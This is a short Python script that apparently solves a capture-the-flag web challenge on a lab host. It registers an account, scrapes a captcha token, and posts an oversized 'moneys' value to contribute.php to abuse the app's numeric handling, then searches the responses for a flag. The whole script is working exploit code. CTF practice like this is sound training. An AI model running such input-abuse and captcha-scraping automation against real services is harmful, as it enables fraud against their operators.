import sys, requests, urllib3, re, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
s.post(BASE + "register.php", data={"user": "whale77", "pass": "pass77"}, timeout=15)
r = s.post(BASE + "index.php", data={"username": "whale77", "password": "pass77"}, timeout=15)
for amt in ("5000000000000000000", "5000000000000000000", "5000000000000000000"):
    r = s.get(BASE + "index.php", timeout=15)
    cap = re.search(r'name="captcha" value="([^"]+)"', r.text)
    r2 = s.post(BASE + "contribute.php", data={"captcha": cap.group(1), "moneys": amt}, timeout=15)
    txt = re.sub(r"<[^>]+>", " ", r2.text)
    txt = re.sub(r"\s+", " ", txt)
    print("[%s] %s" % (amt, txt[:260]))
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
    if m:
        print("FLAG:", m.group(0))
        break
    time.sleep(0.3)
# page finale
r = s.get(BASE + "index.php", timeout=15)
txt = re.sub(r"<[^>]+>", " ", r.text)
print("\nfinale:", re.sub(r"\s+", " ", txt)[:400])
print("flag sur la page:", re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text))
